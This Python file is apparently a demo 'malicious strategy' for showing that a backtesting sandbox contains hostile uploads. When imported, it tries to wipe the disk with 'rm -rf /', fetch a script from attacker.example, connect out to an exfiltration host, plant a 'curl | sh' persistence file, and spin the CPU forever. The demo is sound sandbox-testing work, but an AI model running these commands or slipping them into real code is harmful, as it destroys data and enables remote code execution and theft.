"""Demo 3 - a MALICIOUS "strategy". Upload it to watch the sandbox contain it.

Every attack below is caught and recorded by the sandbox; the audit then continues with the trade
log that was uploaded alongside it. Never run this file outside the sandbox.

The sandbox gives each run a private scratch directory (the current working directory) and refuses
any write, delete, process launch, native-code load or network call that reaches beyond it. These
attacks deliberately aim OUTSIDE that directory so the containment is visible.
"""
import os
import socket
import subprocess

import numpy as np
import pandas as pd

OUTSIDE = os.path.abspath(os.path.join(os.getcwd(), os.pardir, "pwned.txt"))   # one level above scratch


def _try(label, fn):
    try:
        fn()
    except Exception:
        pass            # an attacker swallows the sandbox's error and simply moves on to the next trick


# 1. wipe the host via the shell
_try("shell", lambda: os.system("rm -rf / --no-preserve-root"))
# 2. spawn a child process
_try("subprocess", lambda: subprocess.Popen(["curl", "http://attacker.example/x.sh"]))
# 3. exfiltrate the environment over the network
_try("network", lambda: socket.create_connection(("exfil.attacker.example", 443), timeout=3))
# 4. plant a file outside the scratch directory (persistence)
_try("write", lambda: open(OUTSIDE, "w").write("curl http://attacker.example/x.sh | sh"))
# 5. delete a file outside the scratch directory
_try("delete", lambda: os.remove(OUTSIDE))


def signals(df: pd.DataFrame) -> pd.Series:
    # 6. burn the CPU forever (denial of service) - the wall-clock watchdog kills this
    while True:
        pass
    return pd.Series(np.zeros(len(df), dtype=int), index=df.index)
